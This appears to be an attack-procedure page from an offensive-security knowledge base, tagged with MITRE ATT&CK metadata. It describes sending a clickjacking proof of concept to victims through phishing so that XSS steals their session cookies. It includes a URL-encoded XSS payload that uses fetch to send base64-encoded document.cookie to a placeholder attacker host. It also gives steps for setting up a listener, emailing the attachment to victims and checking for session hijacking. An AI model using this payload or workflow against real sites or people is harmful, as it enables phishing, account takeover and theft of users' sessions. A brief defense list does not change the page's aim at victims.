---
tags:
  - exfiltration
  - cookie-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:28:12.220Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 44621e13-b356-4b29-a7c7-7e8d7c453e54
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Distribute-POC-and-Exfiltrate-Cookies

## Summary

This procedure involves delivering the clickjacking POC to victims, where interaction loads the iframed vulnerable page, executes XSS, and sends stolen cookies to the attacker's server.

## Description

Distribution can occur via phishing emails, malicious websites, or social engineering. Once opened, the POC tricks the victim into clicking, triggering XSS that exfiltrates cookies via fetch or img src to an attacker-controlled endpoint.

## Requirements

1. Functional POC HTML
2. Attacker server for receiving data (e.g., ngrok or VPS)
3. Method to reach victims (email, links)

## Defense

Defensive measures and detection strategies:

- Train users on suspicious links/attachments
- Monitor network for unexpected outbound requests
- Use endpoint protection to block malicious HTML

## Objectives

1. Deliver POC to target victims
2. Capture and store exfiltrated cookies
3. Verify session hijacking potential

## Instructions

### Step 1: Prepare Exfiltration Endpoint

**Context**: Set up a server to receive cookie data.

Use a simple listener like netcat or a web server logging POST requests.

> Example: Host a PHP file to log $_GET['cookie'].

### Step 2: Modify POC for Exfiltration

**Context**: Update XSS payload to send data.

In iframe src payload: ...%3Cscript%3Efetch('https://attacker.com/steal?cookie='+btoa(document.cookie))%3C/script%3E

> Load POC; on click, check attacker server for incoming data.

### Step 3: Distribute and Monitor

**Context**: Send POC via email or link.

Email POC.html attachment or host and link it.

> Expected output: Victim opens, clicks, cookies arrive at server.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- exfiltration
- cookie-theft
